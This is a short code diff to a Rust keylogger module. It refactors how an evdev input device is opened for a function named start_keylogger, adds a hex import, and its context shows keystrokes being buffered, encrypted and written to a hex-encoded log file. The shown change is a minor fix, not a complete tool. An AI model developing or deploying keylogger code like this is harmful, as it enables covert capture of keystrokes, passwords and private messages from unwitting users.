@@ -1,5 +1,4 @@
 use evdev::{Device, InputEventKind};
-use std::fs::File;
 use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::Duration;
@@ -7,6 +6,7 @@ use std::time::Duration;
 use crate::modules::crypto::encrypt_log;
 use std::fs::OpenOptions;
 use std::io::Write;
+use hex;
 
 fn write_encrypted_log(encrypted_data: Vec<u8>) {
     let hex = hex::encode(encrypted_data);
@@ -21,9 +21,7 @@ fn write_encrypted_log(encrypted_data: Vec<u8>) {
 }
 
 pub fn start_keylogger(device_path: &str) {
-    let file = File::open(device_path).expect("Impossible d'ouvrir le device");
-    let mut dev = Device::new().unwrap();
-    dev.set_file(file);
+    let mut dev = Device::open(device_path).expect("Impossible d'ouvrir le device");
 
     let buffer = Arc::new(Mutex::new(String::new()));
     let buffer_clone = Arc::clone(&buffer);
